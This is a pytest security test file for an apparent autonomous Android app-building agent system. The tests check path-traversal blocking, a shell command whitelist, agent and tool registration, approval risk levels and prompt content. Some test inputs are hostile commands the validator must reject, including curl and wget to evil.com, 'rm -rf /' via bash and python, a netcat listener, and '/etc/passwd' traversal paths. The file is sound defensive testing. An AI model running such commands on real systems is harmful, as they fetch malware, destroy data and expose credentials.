"""Security tests for App Factory tools.

Validates:
- Path traversal blocking
- Shell command whitelist enforcement
- Input validation
"""

from __future__ import annotations

import json

import pytest

from src.tools.app_factory_tools import (
    _ALLOWED_COMMANDS,
    _validate_command,
    _validate_path,
)


# ---------------------------------------------------------------------------
# Path traversal tests
# ---------------------------------------------------------------------------


class TestPathValidation:
    def test_normal_path(self):
        result = _validate_path("proj_abc", "app/src/main/kotlin/Main.kt")
        assert result == "/workspace/proj_abc/app/src/main/kotlin/Main.kt"

    def test_root_relative(self):
        result = _validate_path("proj_abc", "/app/build.gradle.kts")
        assert result == "/workspace/proj_abc/app/build.gradle.kts"

    def test_dot_path(self):
        result = _validate_path("proj_abc", ".")
        assert result == "/workspace/proj_abc/."

    def test_traversal_blocked_double_dot(self):
        with pytest.raises(ValueError, match="Path traversal blocked"):
            _validate_path("proj_abc", "../etc/passwd")

    def test_traversal_blocked_mid_path(self):
        with pytest.raises(ValueError, match="Path traversal blocked"):
            _validate_path("proj_abc", "app/../../etc/shadow")

    def test_traversal_blocked_encoded(self):
        with pytest.raises(ValueError, match="Path traversal blocked"):
            _validate_path("proj_abc", "app/..%2F..%2Fetc/passwd")

    def test_traversal_blocked_double_dot_only(self):
        with pytest.raises(ValueError, match="Path traversal blocked"):
            _validate_path("proj_abc", "..")


# ---------------------------------------------------------------------------
# Command whitelist tests
# ---------------------------------------------------------------------------


class TestCommandValidation:
    def test_allowed_gradle(self):
        _validate_command("./gradlew assembleDebug")  # Should not raise

    def test_allowed_gradle_full(self):
        _validate_command("gradle build")

    def test_allowed_ls(self):
        _validate_command("ls -la")

    def test_allowed_find(self):
        _validate_command("find . -name '*.kt' -type f")

    def test_allowed_mkdir(self):
        _validate_command("mkdir -p src/main/kotlin")

    def test_allowed_cat(self):
        _validate_command("cat build.gradle.kts")

    def test_blocked_curl(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("curl https://evil.com/payload")

    def test_blocked_wget(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("wget https://evil.com/malware")

    def test_blocked_python(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_blocked_pip(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("pip install evil-package")

    def test_blocked_npm(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("npm install evil-package")

    def test_blocked_bash_c(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("bash -c 'rm -rf /'")

    def test_blocked_eval(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("eval dangerous_command")

    def test_blocked_nc(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("nc -l 4444")

    def test_blocked_ssh(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("ssh user@host")

    def test_blocked_apt(self):
        with pytest.raises(ValueError, match="Blocked command pattern"):
            _validate_command("apt install something")

    def test_not_in_whitelist(self):
        with pytest.raises(ValueError, match="not in whitelist"):
            _validate_command("whoami")

    def test_empty_command(self):
        with pytest.raises(ValueError, match="Empty command"):
            _validate_command("")

    def test_whitespace_only(self):
        with pytest.raises(ValueError, match="Empty command"):
            _validate_command("   ")


# ---------------------------------------------------------------------------
# Allowed commands set
# ---------------------------------------------------------------------------


class TestAllowedCommands:
    def test_essential_commands_present(self):
        for cmd in ["gradlew", "gradle", "java", "ls", "find", "mkdir", "cat", "rm"]:
            assert cmd in _ALLOWED_COMMANDS, f"{cmd} should be in allowed commands"

    def test_dangerous_commands_absent(self):
        for cmd in ["curl", "wget", "python", "pip", "npm", "node", "ssh", "scp"]:
            assert cmd not in _ALLOWED_COMMANDS, f"{cmd} should NOT be in allowed commands"


# ---------------------------------------------------------------------------
# Workflow definition tests
# ---------------------------------------------------------------------------


class TestWorkflowDefinition:
    def test_app_factory_workflow_exists(self):
        from src.workflow_registry import APP_FACTORY_WORKFLOW

        assert APP_FACTORY_WORKFLOW.workflow_id == "app_factory"
        assert APP_FACTORY_WORKFLOW.display_name == "App Factory"

    def test_app_factory_has_all_nodes(self):
        from src.workflow_registry import APP_FACTORY_WORKFLOW

        node_ids = {n.node_id for n in APP_FACTORY_WORKFLOW.nodes}
        expected = {"af_orchestrator", "af_architect", "af_coder", "af_tester",
                    "af_security", "af_builder", "af_deployer"}
        assert node_ids == expected

    def test_app_factory_entry_point(self):
        from src.workflow_registry import APP_FACTORY_WORKFLOW

        entries = [n for n in APP_FACTORY_WORKFLOW.nodes if n.is_entry_point]
        assert len(entries) == 1
        assert entries[0].node_id == "af_orchestrator"

    def test_all_specialists_route_back(self):
        from src.workflow_registry import APP_FACTORY_WORKFLOW

        specialists = {"af_architect", "af_coder", "af_tester",
                       "af_security", "af_builder", "af_deployer"}
        back_edges = {e.source_node_id for e in APP_FACTORY_WORKFLOW.edges
                      if e.target_node_id == "af_orchestrator"}
        assert specialists == back_edges

    def test_orchestrator_has_conditional_routing(self):
        from src.workflow_registry import APP_FACTORY_WORKFLOW

        orch_edges = [e for e in APP_FACTORY_WORKFLOW.edges
                      if e.source_node_id == "af_orchestrator"]
        assert len(orch_edges) == 1
        assert orch_edges[0].edge_type == "conditional"
        assert len(orch_edges[0].conditions) >= 7


# ---------------------------------------------------------------------------
# Agent registration tests
# ---------------------------------------------------------------------------


class TestAgentRegistration:
    def test_all_af_agents_registered(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        af_agents = {k for k in _HARDCODED_DEFAULTS if k.startswith("af_")}
        expected = {"af_orchestrator", "af_architect", "af_coder", "af_tester",
                    "af_security", "af_builder", "af_deployer"}
        assert af_agents == expected

    def test_af_agents_have_tools(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        for agent_id in ["af_orchestrator", "af_architect", "af_coder"]:
            agent = _HARDCODED_DEFAULTS[agent_id]
            assert len(agent.tool_ids) > 0, f"{agent_id} should have tools"

    def test_af_orchestrator_has_state_tool(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        orch = _HARDCODED_DEFAULTS["af_orchestrator"]
        assert "af_state" in orch.tool_ids

    def test_af_coder_has_shell(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        coder = _HARDCODED_DEFAULTS["af_coder"]
        assert "af_shell" in coder.tool_ids
        assert "af_write_file" in coder.tool_ids

    def test_af_deployer_has_play_store(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        deployer = _HARDCODED_DEFAULTS["af_deployer"]
        assert "af_play_store" in deployer.tool_ids

    def test_af_channel_ids_unique(self):
        from src.agent_registry import _HARDCODED_DEFAULTS

        af_channels = [v.channel_id for k, v in _HARDCODED_DEFAULTS.items() if k.startswith("af_")]
        assert len(af_channels) == len(set(af_channels))


# ---------------------------------------------------------------------------
# Tool registration tests
# ---------------------------------------------------------------------------


class TestToolRegistration:
    def test_all_af_tools_registered(self):
        from src.tool_registry import _TOOL_DEFINITIONS

        af_tools = {t.tool_id for t in _TOOL_DEFINITIONS if t.category == "app_factory"}
        expected = {"af_write_file", "af_read_file", "af_list_files", "af_shell",
                    "af_docker_start", "af_docker_stop", "af_play_store", "af_state"}
        assert af_tools == expected

    def test_af_tools_correct_module(self):
        from src.tool_registry import _TOOL_DEFINITIONS

        for t in _TOOL_DEFINITIONS:
            if t.category == "app_factory":
                assert t.module_path == "src.tools.app_factory_tools"


# ---------------------------------------------------------------------------
# Approval gate tests
# ---------------------------------------------------------------------------


class TestApprovalGate:
    def test_play_store_is_high_risk(self):
        from src.approval import ApprovalGate

        risk = ApprovalGate.classify_risk("af_play_store", {})
        assert risk == "high"

    def test_af_workspace_tools_auto_approved(self):
        from src.approval import ApprovalGate

        for tool_name in ["af_write_file", "af_read_file", "af_list_files",
                          "af_shell", "af_docker_start", "af_docker_stop", "af_state"]:
            risk = ApprovalGate.classify_risk(tool_name, {})
            assert risk == "low", f"{tool_name} should be auto-approved (low risk)"


# ---------------------------------------------------------------------------
# Constitution / prompt injection tests
# ---------------------------------------------------------------------------


class TestConstitution:
    def test_af_agents_get_af_preamble(self):
        from src.agents.constitution import build_system_prompt

        prompt = build_system_prompt("af_orchestrator", "")
        assert "App Factory" in prompt
        assert "autonomous Android development" in prompt

    def test_af_orchestrator_gets_routing_prompt(self):
        from src.agents.constitution import build_system_prompt

        prompt = build_system_prompt("af_orchestrator", "")
        assert "Phase Routing" in prompt
        assert "af_architect" in prompt

    def test_af_coder_gets_coding_prompt(self):
        from src.agents.constitution import build_system_prompt

        prompt = build_system_prompt("af_coder", "")
        assert "Kotlin" in prompt
        assert "Jetpack Compose" in prompt

    def test_af_security_gets_owasp_prompt(self):
        from src.agents.constitution import build_system_prompt

        prompt = build_system_prompt("af_security", "")
        assert "OWASP" in prompt
        assert "M1" in prompt

    def test_non_af_agents_unaffected(self):
        from src.agents.constitution import build_system_prompt

        prompt = build_system_prompt("sales_marketing", "Test prompt")
        assert "App Factory" not in prompt
        assert "Test prompt" in prompt
